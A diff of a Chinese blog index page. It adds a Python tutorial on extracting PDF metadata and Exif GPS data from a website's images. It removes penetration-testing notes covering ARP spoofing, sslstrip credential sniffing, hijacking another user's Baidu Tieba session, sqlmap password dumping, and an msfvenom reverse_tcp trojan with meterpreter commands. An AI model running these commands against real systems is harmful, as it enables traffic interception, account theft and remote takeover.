@@ -150,6 +150,97 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-python解析Exif元数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/15/python解析Exif元数据/">python解析Exif元数据</a>
+    </h1>
+  
+
+        
+        <a href="/2018/10/15/python解析Exif元数据/" class="archive-article-date">
+  	<time datetime="2018-10-15T07:14:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><p>从文件中提取元数据。文件不是清晰可见 的对象，元数据可以存在于文档，电子表格，图像，音频和视频等文件类型中。 创作应用程序可能会存储一些细节如文件的作者，创建和修改时间，潜在的修订和注释。例如，拍照手机可以标记本地的GPS在照片中或者微软的 Word 应用程序可以存储文档的作者。检查每一个文件是个艰难的任务，我们可以使用Python自动处理。</p>
+<h3 id="使用PyPDF解析PDF元数据"><a href="#使用PyPDF解析PDF元数据" class="headerlink" title="使用PyPDF解析PDF元数据"></a>使用PyPDF解析PDF元数据</h3><p>PyPDF 是一个优秀的第三方管理 PDF 文件很实用的库，它提供了文档的信息提取，分割，合并，加密 和解密的能力。</p>
+<p>为了提取元数据，我们使用函数 getDocumentInfo()。这个方法返回一个元组数组，每一个元组包含一个元数据元素和它的值。遍历这个数组并打印 PDF 文件的全部元数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> pyPdf</span><br><span class="line"><span class="keyword">from</span> pyPdf <span class="keyword">import</span> PdfFileReader</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMeta</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    pdfFile = PdfFileReader(file(fileName, <span class="string">'rb'</span>))</span><br><span class="line">    docInfo = pdfFile.getDocumentInfo()</span><br><span class="line">    print(<span class="string">'[*]PDF MetaData FOr:'</span> + str(fileName))</span><br><span class="line">    <span class="keyword">for</span> metaItem <span class="keyword">in</span> docInfo:</span><br><span class="line">        print(<span class="string">'[+]'</span> + metaItem + <span class="string">':'</span> + docInfo[metaItem])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">'usage %prog -F &lt;PDF file name&gt;'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-F'</span>, dest=<span class="string">'fileName'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify PDF file name'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    fileName = options.fileName</span><br><span class="line">    <span class="keyword">if</span> fileName == <span class="keyword">None</span>:</span><br><span class="line">        print(parser.usage)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printMeta(fileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h3 id="理解Exif元数据"><a href="#理解Exif元数据" class="headerlink" title="理解Exif元数据"></a>理解Exif元数据</h3><p>Exif 是一种图象文件格式，它的数据存储与 JPEG 格式是完全相同的。实际上 Exif 格式就是在 JPEG 格式头部插入了数码照片的信息，包括拍摄时的光圈、快 门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、 色彩编码、拍摄时录制的声音以及全球定位系统（GPS）、缩略图等。简单地Exif=JPEG+拍摄参数。</p>
+<p>Phil Harvey 编写了一个实用的工具名 叫 exiftool(从 <a href="http://www.sno.phy.queensu.ca/~phil/exiftool/可获得)能解析这" target="_blank" rel="noopener">http://www.sno.phy.queensu.ca/~phil/exiftool/可获得)能解析这</a> 些参数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">investigator$ exiftool photo.JPG</span><br><span class="line">ExifTool Version Number : 8.76</span><br><span class="line">File Name : photo.JPG</span><br><span class="line">Directory : /home/investigator/photo.JPG</span><br><span class="line">File Size : 1626 kB</span><br><span class="line">File Modification Date/Time : 2012:02:01 08:25:37-07:00</span><br><span class="line">File Permissions : rw-r--r--</span><br><span class="line">File Type : JPEG</span><br><span class="line">MIME Type : image/jpeg</span><br><span class="line">Exif Byte Order : Big-endian (Motorola, MM)</span><br><span class="line">Make</span><br><span class="line">: Apple</span><br><span class="line">Camera Model Name : iPhone 4S</span><br><span class="line">Orientation : Rotate 90 CW</span><br><span class="line">&lt;..SNIPPED..&gt;</span><br><span class="line">GPS Altitude : 10 m Above Sea Level</span><br><span class="line">GPS Latitude : 89 deg 59<span class="string">' 59.97" N</span></span><br><span class="line"><span class="string">GPS Longitude : 36 deg 26'</span> 58.57<span class="string">" W</span></span><br><span class="line"><span class="string">&lt;..SNIPPED..&gt;</span></span><br></pre></td></tr></table></figure>
+<p>建立一个脚本来连接web网站，下载图像，并检测他们的Exif元数据。</p>
+<h3 id="使用BeautifulSoup下载图像"><a href="#使用BeautifulSoup下载图像" class="headerlink" title="使用BeautifulSoup下载图像"></a>使用BeautifulSoup下载图像</h3><p><code>BeautifulSoup</code>允许我们快速的解析HTML和 XML文档,使用BeautifulSoup来抓取HTML文档的内容来获取文档中所有的图像。使用urllib2打开文档来读取它，可以创造Beautiful对象或者包含一个不同HTML文档对象的解析树。用这样的对象， 我么可以提取所有的图像标签，通过使用 findall(‘img’)函数，这个函数返回一 个包含所有图像标签的数组。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findImages</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'[+] Finding images on'</span> + url)</span><br><span class="line">    urlContent = urllib2.urlopen(url).read()</span><br><span class="line">    soup = BeautifulSoup(urlContent)</span><br><span class="line">    imgTags = soup.findAll(<span class="string">'img'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgTags</span><br></pre></td></tr></table></figure>
+<p>从网站中下载每一个图像，然后在单独的函数中进行检查。 为了下载图像，我们将用到 urllib2，urlparse 和 os 模块。首先，我们从图像标 签中提取源地址，接着我们读取图像的二进制内容到一个变量，最后我们以写- 二进制模式打开文件将图像内容写入文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadImage</span><span class="params">(imgTag)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">'[+]Downloading image...'</span>)</span><br><span class="line">        imgSrc = imgTag[<span class="string">'src'</span>]</span><br><span class="line">        imgContent = urllib2.urlopen(imgSrc).read()</span><br><span class="line">        imgFileName = basename(urlsplit(imgSrc)[<span class="number">2</span>])</span><br><span class="line">        imgFle = open(imgFileName, <span class="string">'wb'</span>)</span><br><span class="line">        imgFle.write(imgContent)</span><br><span class="line">        imgFle.close()</span><br><span class="line">        <span class="keyword">return</span> imgFileName</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure>
+<h3 id="使用python的图像库从图像阅读Exif元数据"><a href="#使用python的图像库从图像阅读Exif元数据" class="headerlink" title="使用python的图像库从图像阅读Exif元数据"></a>使用python的图像库从图像阅读Exif元数据</h3><p>为了测试图像的内容特到 Exif 元数据，我们将使用 Python 图像库 PIL 来处理文 件，可以从 <a href="http://www.pythonware.com/products/pil/获得，以增加" target="_blank" rel="noopener">http://www.pythonware.com/products/pil/获得，以增加</a> Python 的 图像处理能力，并允许我们快速的提取与地理位置相关的元数据信息。为了测 试文件元数据，我们将打开的对象作为 PIL 图像对象并使用函数 getexif()。接 下来我们解析 Exif 数据到一个数组，通过元数据类型索引。数组完成后，我们 可以搜索数组看看它是否包含有 GPSInfo 的 Exif 参数。如果它包含 GPSInfo 参 数，我们就知道对象包含 GPS 元数据并打印信息到屏幕上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testForExif</span><span class="params">(imgFileName)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exifData = &#123;&#125;</span><br><span class="line">        imgFile = Image.open(imgFileName)</span><br><span class="line">        info = imgFile._getexif()</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            <span class="keyword">for</span> (tag, value) <span class="keyword">in</span> info.items():</span><br><span class="line">                decoded = TAGS.get(tag, tag)</span><br><span class="line">                exifData[decoded] = value</span><br><span class="line">            exifGPS = exifData[<span class="string">'GPSInfo'</span>]</span><br><span class="line">            <span class="keyword">if</span> exifGPS:</span><br><span class="line">                print(<span class="string">'[*]'</span> + imgFileName + <span class="string">'contains GPS MetaData'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<h3 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h3><p>将所有的包装在一起，可以连接到一个URL地址，解析并下载所有的图像文件，然后测试每个文件的Exif元数据。</p>
+<p>main()函数中，首先获得站点上的所有图像的列表，然后对数据中的每一个图像，我们将下载并测试它的GPS元数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding =UTF-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlsplit</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL.ExifTags <span class="keyword">import</span> TAGS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findImages</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'[+] Finding images on '</span> + url)</span><br><span class="line">    urlContent = urllib2.urlopen(url).read()</span><br><span class="line">    soup = BeautifulSoup(urlContent)</span><br><span class="line">    imgTags = soup.findAll(<span class="string">'img'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgTags</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadImage</span><span class="params">(imgTag)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">'[+]Downloading image...'</span>)</span><br><span class="line">        imgSrc = imgTag[<span class="string">'src'</span>]</span><br><span class="line">        imgContent = urllib2.urlopen(imgSrc).read()</span><br><span class="line">        imgFileName = basename(urlsplit(imgSrc)[<span class="number">2</span>])</span><br><span class="line">        imgFle = open(imgFileName, <span class="string">'wb'</span>)</span><br><span class="line">        imgFle.write(imgContent)</span><br><span class="line">        imgFle.close()</span><br><span class="line">        <span class="keyword">return</span> imgFileName</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testForExif</span><span class="params">(imgFileName)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exifData = &#123;&#125;</span><br><span class="line">        imgFile = Image.open(imgFileName)</span><br><span class="line">        info = imgFile._getexif()</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            <span class="keyword">for</span> (tag, value) <span class="keyword">in</span> info.items():</span><br><span class="line">                decoded = TAGS.get(tag, tag)</span><br><span class="line">                exifData[decoded] = value</span><br><span class="line">            exifGPS = exifData[<span class="string">'GPSInfo'</span>]</span><br><span class="line">            <span class="keyword">if</span> exifGPS:</span><br><span class="line">                print(<span class="string">'[*]'</span> + imgFileName + <span class="string">'contains GPS MetaData'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">'usage%prog -u &lt;target url&gt;'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-u'</span>, dest=<span class="string">'url'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify url address'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    url = options.url</span><br><span class="line">    <span class="keyword">if</span> url == <span class="keyword">None</span>:</span><br><span class="line">        print(parser.usage)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        imgTags = findImages(url)</span><br><span class="line">        <span class="keyword">for</span> imgTag <span class="keyword">in</span> imgTags:</span><br><span class="line">            imgFileName = downloadImage(imgTag)</span><br><span class="line">            testForExif(imgFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">forensics: <span class="comment"># python exifFetch.py -u</span></span><br><span class="line">http://www.flickr.com/photos/dvids/4999001925/sizes/o</span><br><span class="line">[+] Finding images on</span><br><span class="line">http://www.flickr.com/photos/dvids/4999001925/sizes/o</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[*] 4999001925_ab6da92710_o.jpg contains GPS MetaData</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br><span class="line">[+] Dowloading image...</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/15/python解析Exif元数据/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-web渗透测试入门之-你是会员吗" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1326,234 +1417,9 @@
 
 
   
-    <article id="post-Kali渗透学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/21/Kali渗透学习笔记/">Kali渗透学习笔记</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/21/Kali渗透学习笔记/" class="archive-article-date">
-  	<time datetime="2018-09-21T02:11:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Kali渗透测试"><a href="#Kali渗透测试" class="headerlink" title="Kali渗透测试"></a>Kali渗透测试</h3><ul>
-<li><p>Xshell连接</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启SSH链接</span><br><span class="line">kali中进入命令行模式 alt+ctrl+f1=&gt; /etc/init.d/ssh start</span><br><span class="line">Xshell链接 ：输入kali的ip，root账户密码即可</span><br><span class="line">kali后台运行</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>arp攻击：</p>
-<ul>
-<li>目标的ip流量经过我的网卡</li>
-<li><code>arpspoof  -i 网卡 -t 目标IP 网关</code></li>
-<li>查看局域网ip <code>Fping -asg 192.168.1.0/24</code></li>
-<li>IP流量转发： <code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code> 就不会出现断网</li>
-</ul>
-</li>
-<li><p>arp欺骗</p>
-<ul>
-<li><p>目标的ip流量经过我的网卡，从网关出去</p>
-</li>
-<li><p>先进行arp欺骗</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof  -i 网卡 -t 目标IP 网关</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>driftnet  -&gt;获取本机网卡的流量信息</p>
-<ul>
-<li><code>driftnet -i 网卡</code></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>http账户密码获取</p>
-<ul>
-<li><code>Ettercap</code>：欺骗，DNS欺骗，流量嗅探</li>
-<li>先进行arp欺骗</li>
-<li><code>ettercap -Tq -i 网卡</code> 启动文本模式和安静模式 嗅探流量</li>
-</ul>
-</li>
-<li><p>https账户密码获取</p>
-<ul>
-<li><code>sslstrip</code>工具 将https链接还原为HTTP</li>
-<li><code>vim /etc/ettercap/etter.conf</code>  删除<code>if you use iptables：</code>底下的2个#注释</li>
-<li>先进行 <code>sslstrip -a -f -k</code></li>
-<li>再进行arp欺骗</li>
-<li>最后嗅探 ettercap</li>
-<li>缺点：https容易出现证书错误</li>
-</ul>
-</li>
-<li><p>会话截取-登录别人的百度贴吧</p>
-<ul>
-<li>方法一：<ul>
-<li><code>arpspoof + wireshark+ferret（重新生成抓包后的文件）+hamster（重放流量）</code></li>
-<li>先 arp欺骗</li>
-<li>wireshark抓包：增加本地网卡，等刷新后，保存xxx.pcap文件</li>
-<li><code>ferret -r xxx.pcap</code>   生成<code>hamster.txt</code>文件</li>
-<li>将hamster.txt文件拷贝到/root/目录</li>
-<li><code>hamster</code> 命令，安装要求打开浏览器设置代理及端口，可以看到欺骗的ip</li>
-<li>寻找重放的页面</li>
-</ul>
-</li>
-<li>方法二：<ul>
-<li>不需要欺骗</li>
-<li><code>ferret -i 网卡</code>   浏览器设置端口</li>
-<li><code>hamster</code>  浏览器设置端口1234</li>
-<li>实时重放页面可挟持</li>
-</ul>
-</li>
-<li>方法三：<ul>
-<li>一键劫持软件：CookieCadger-jar </li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>SQLMAP及ASP网站渗透</p>
-<ul>
-<li>asp网站 大多数用的Access和MSSQL</li>
-<li><code>sqlmap -u &quot;URL&quot;</code>:检测是否存在注入，返回数据库的名字</li>
-<li><code>sqlmap -u &quot;URL&quot; --tables</code> 猜解所有的表名</li>
-<li><code>sqlmap -u &quot;URL&quot; --columns -T &quot;tables名字&quot;</code>  猜列名</li>
-<li><code>sqlmap -u &quot;URL&quot; --dump -C &quot;username,password&quot; -T &quot;tables的名字&quot;</code>  –dump下载数据</li>
-</ul>
-</li>
-<li><p>SQLMAP及PHP网站渗透</p>
-<ul>
-<li>php网站大多数是mysql</li>
-<li><code>sqlmap -u &quot;URL&quot;</code>:检测是否有注入</li>
-<li><code>sqlmap -u &quot;URL&quot; --is-dba</code>  ：是否能遍历,目录文件写文件</li>
-<li><code>sqlmap -u &quot;URL&quot; --dbs</code> 列出所有数据库</li>
-<li><code>sqlmap -u &quot;URL&quot; --current-db</code> 查找自己当前使用的数据库</li>
-<li><code>sqlmap -u &quot;URL&quot; --tables -D &quot;数据库名&quot;</code> 根据数据来猜解所有的表名</li>
-<li><code>sqlmap -u &quot;URL&quot; --columns -T &quot;表名&quot; -D &quot;数据库名&quot;</code> 查询所有的列</li>
-<li><code>sqlmap -u &quot;URL&quot; --dump -C &quot;username,password&quot; -T &quot;表名&quot; -D &quot;数据库名&quot;</code> 查询列的字段</li>
-</ul>
-</li>
-<li><p>SQLMAP及Cookie注入</p>
-<ul>
-<li><code>sqlmap -u &quot;URL&quot;  --cookie &quot;id参数&quot; --level 2</code> &lt;不需要？及id=？，以asp等结尾的URL&gt; 、cookie注入，就要把等级提升为level 2</li>
-</ul>
-</li>
-<li><p>Metasploit</p>
-<ul>
-<li>启动<code>msfconsole</code></li>
-<li>Exploit模块=&gt;漏洞利用，Payloads=&gt;-hellcode 漏洞利用后执行的代码</li>
-<li>使用 <ul>
-<li><code>use exploit/windows/smb/ms08_067_netapi</code>选择漏洞利用模块</li>
-<li><code>show options</code> 查看要填入的参数</li>
-<li><code>set RHOST ....</code></li>
-<li><code>set PAYLOAD xx/xx/xx</code></li>
-<li><code>show options</code></li>
-<li><code>exploit</code> 执行</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Metasploit远程控制软件</p>
-<ul>
-<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.根据自己的ip生成一个木马/msfvenom</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx1 LPROT=xx2 -f exe &gt; xx.exe</span><br><span class="line">2.使用handler模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">使用shellcode选项</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">查看选项</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> LHOST xx1</span><br><span class="line"><span class="built_in">set</span> LPROT xx2</span><br><span class="line">3.exploit</span><br><span class="line">等待对方点击xx.exe木马文件</span><br><span class="line">4.sysinfo/shell等命令</span><br></pre></td></tr></table></figure>
-</li>
-<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#木马常用功能：</span></span><br><span class="line">1.backgroud &lt;会话切换&gt;</span><br><span class="line">  session -l 查看session进程</span><br><span class="line">  session -i x 选择session进程</span><br><span class="line">******注入进程重要**********</span><br><span class="line">2.ps得到我们要注入的pid进程</span><br><span class="line">  migrate xxx：注入进程</span><br><span class="line">3.run vnc  ：开启远程桌面</span><br></pre></td></tr></table></figure>
-</li>
-<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件管理功能</span></span><br><span class="line">download 下载文件</span><br><span class="line">edit	 编辑文件</span><br><span class="line">cat		 查看文件</span><br><span class="line">mkdir	 创建文件夹</span><br><span class="line">mv		 移动文件</span><br><span class="line">rm		 删除文件</span><br><span class="line">upload	 上传文件</span><br><span class="line">rmdir    删除文件夹</span><br></pre></td></tr></table></figure>
-</li>
-<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#网络及系统操作</span></span><br><span class="line">arp			看ARP缓冲表</span><br><span class="line">ifconfig	IP地址网卡</span><br><span class="line">getproxy	获取代理</span><br><span class="line">netstat		查看端口链接</span><br><span class="line"><span class="built_in">kill</span>		结束进程</span><br><span class="line">ps			查看进程</span><br><span class="line">reg			修改注册表</span><br></pre></td></tr></table></figure>
-</li>
